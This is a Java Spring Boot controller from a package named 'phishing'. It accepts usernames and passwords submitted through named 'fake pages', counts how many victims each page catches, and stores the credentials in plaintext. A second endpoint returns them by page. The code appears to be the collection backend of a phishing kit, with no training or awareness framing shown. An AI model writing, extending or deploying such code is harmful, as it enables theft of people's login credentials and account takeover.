package com.belen.phishing.controllers;

import com.belen.phishing.model.FakePageEntity;
import com.belen.phishing.model.FakeUserEntity;
import com.belen.phishing.repository.FakePageRepository;
import com.belen.phishing.repository.FakeUserRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.List;

@RestController
@RequestMapping("/api/fakeuser")
public class FakeUserController {
    @Autowired
    private FakeUserRepository fakeUserRepository;

    @Autowired
    private FakePageRepository fakePageRepository;

    @PostMapping("/create")
    public ResponseEntity<String> createFakeUser(@RequestParam String username, @RequestParam String password, @RequestParam String fakePageName) {
        FakePageEntity fakePage = fakePageRepository.findByNombre(fakePageName);
        if (fakePage == null) {
            return new ResponseEntity<>("Fake page not found", HttpStatus.NOT_FOUND);
        }

        // Increment the picks field by 1
        if (fakePage.getPicks() == null) {
            fakePage.setPicks(1);
        } else {
            fakePage.setPicks(fakePage.getPicks() + 1);
        }
        fakePageRepository.save(fakePage);

        FakeUserEntity fakeUser = new FakeUserEntity();
        fakeUser.setUsername(username);
        fakeUser.setPassword(password);
        fakeUser.setFakePage(fakePage);

        fakeUserRepository.save(fakeUser);

        return new ResponseEntity<>("Fake user created successfully", HttpStatus.OK);
    }

    @GetMapping("/getByPageName")
    public ResponseEntity<List<FakeUserEntity>> getByPageName(@RequestParam String fakePageName) {
        FakePageEntity fakePage = fakePageRepository.findByNombre(fakePageName);
        if (fakePage == null) {
            return new ResponseEntity<>(HttpStatus.NOT_FOUND);
        }
        List<FakeUserEntity> fakeUsers = fakeUserRepository.findByFakePage(fakePage);
        return new ResponseEntity<>(fakeUsers, HttpStatus.OK);
    }
}
